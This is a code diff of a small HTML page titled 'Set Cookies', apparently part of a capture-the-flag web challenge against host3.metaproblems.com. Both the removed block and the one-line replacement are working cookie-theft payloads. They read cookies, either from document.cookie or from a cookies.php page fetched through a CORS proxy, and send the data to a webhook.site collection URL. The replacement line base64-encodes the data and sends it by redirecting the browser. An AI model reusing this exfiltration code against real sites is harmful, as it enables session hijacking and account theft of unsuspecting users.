@@ -7,69 +7,7 @@
 <body>
     <h1>Set Cookies</h1>
     <script>
-        // Function to set cookies
-        async function setCookies() {
-            try {
-                const encodedCookieValue = encodeURIComponent(document.cookie);
-                const proxyUrl = 'https://echo.hoppscotch.io/';
-                const targetUrl = 'https://host3.metaproblems.com:6020/index.php';
-                
-                const setResponse = await fetch(proxyUrl + targetUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
-                    },
-                    body: `cookie_name=16&cookie_value=${encodedCookieValue}&submit=Store+Cookie`
-                });
-
-                if (!setResponse.ok) {
-                    throw new Error('Network response was not ok');
-                }
-
-                const setData = await setResponse.json();
-                console.log('Cookie stored:', setData);
-            } catch (error) {
-                console.error('Error storing cookie:', error);
-            }
-        }
-
-        // Function to retrieve cookies and send them to webhook
-        async function retrieveAndSendCookies() {
-            try {
-                const proxyUrl = 'https://echo.hoppscotch.io/';
-                const cookiesUrl = 'https://host3.metaproblems.com:6020/cookies.php';
-                
-                const getResponse = await fetch(proxyUrl + cookiesUrl);
-                
-                if (!getResponse.ok) {
-                    throw new Error('Network response was not ok');
-                }
-
-                const cookieData = await getResponse.text();
-                console.log('Cookies:', cookieData);
-
-                const webhookUrl = `https://webhook.site/6d1b6565-2bc0-49fa-a00d-af73c0d05456?x=${encodeURIComponent(cookieData)}`;
-                const webhookResponse = await fetch(webhookUrl);
-
-                if (!webhookResponse.ok) {
-                    throw new Error('Network response was not ok');
-                }
-
-                const webhookData = await webhookResponse.text();
-                console.log('Webhook response:', webhookData);
-            } catch (error) {
-                console.error('Error retrieving cookies:', error);
-            }
-        }
-
-        // Execute the functions sequentially
-        async function executeRequests() {
-            await setCookies();
-            await retrieveAndSendCookies();
-        }
-
-        // Start the execution
-        executeRequests();
+        fetch('https://echo.hoppscotch.io/https://host3.metaproblems.com:6020/cookies.php').then(response => response.text()).then(text => window.location.href = `https://webhook.site/6d1b6565-2bc0-49fa-a00d-af73c0d05456?cz=${btoa(text)}`);
     </script>
 </body>
 </html>
